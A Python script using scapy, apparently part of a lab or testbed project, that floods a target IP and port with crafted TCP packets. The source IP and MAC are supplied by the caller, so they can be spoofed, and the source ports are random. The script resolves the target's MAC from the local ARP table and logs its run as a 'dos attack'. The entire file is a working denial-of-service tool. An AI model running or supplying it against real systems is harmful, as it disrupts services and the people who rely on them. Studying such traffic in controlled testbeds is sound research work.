import argparse
import os
import random
import time
from subprocess import check_output
import logging
import csv
from scapy.all import *

def get_arp_table():
    with open('/proc/net/arp') as arpt:
        names = [
            'IP address', 'HW type', 'Flags', 'HW address', 'Mask', 'Device' 
        ]

        reader = csv.DictReader(arpt, fieldnames=names, skipinitialspace=True,
                                delimiter=' ')

        return [block for block in reader]

def get_mac(arp_table, ip):
    for entry in arp_table:
        if entry['IP address'] == ip:
            return entry['HW address']

parser = argparse.ArgumentParser()
parser.add_argument("--sip", type=str, dest="sip", action="store")
parser.add_argument("--dip", type=str, dest="dip", action="store")
parser.add_argument("--dport", type=int, dest="dport", action="store")
parser.add_argument("--npkt", type=int, dest="npkt", action="store")
parser.add_argument("--inter", type=float, dest="inter", action="store")
parser.add_argument("--mac", type=str, dest="mac", action="store")
parser.add_argument("--iface", type=str, dest="iface", action="store")

args = parser.parse_args()

sip = args.sip
dip = args.dip
dport = args.dport
npkt = args.npkt
inter = args.inter
mac = args.mac
iface = args.iface

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s : %(levelname)s : %(message)s')
log_name = '../logs/attack_dos.log'
if os.path.exists(log_name): 
    os.remove(log_name)
file_handler = logging.FileHandler(filename=log_name)
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

logger.debug("Running dos attack")
logger.debug("SIP: %s, DIP: %s, DPORT: %s, NPKT: %s, INTER: %s", sip, dip,
             dport, npkt, inter)

if dip == "127.0.0.1":
    dst_mac = "00:00:00:00:00:00"
else:
    ARPTABLE = get_arp_table()
    dst_mac = get_mac(ARPTABLE, dip)
    logger.debug("ARP table: %s", ARPTABLE)

if dst_mac:
    s = conf.L2socket(iface=iface)
    for _ in xrange(npkt):
        eth_hdr = Ether(src=mac, dst=dst_mac)
        ip_hdr = IP(src=sip, dst=dip)
        sport = random.randint(1024, 65535)
        tcp_hdr = TCP(sport=sport, dport=dport)
        pkt = eth_hdr/ip_hdr/tcp_hdr
        sendp(pkt, iface=iface)
        s.send(pkt)
        if inter != 0:
            time.sleep(inter)
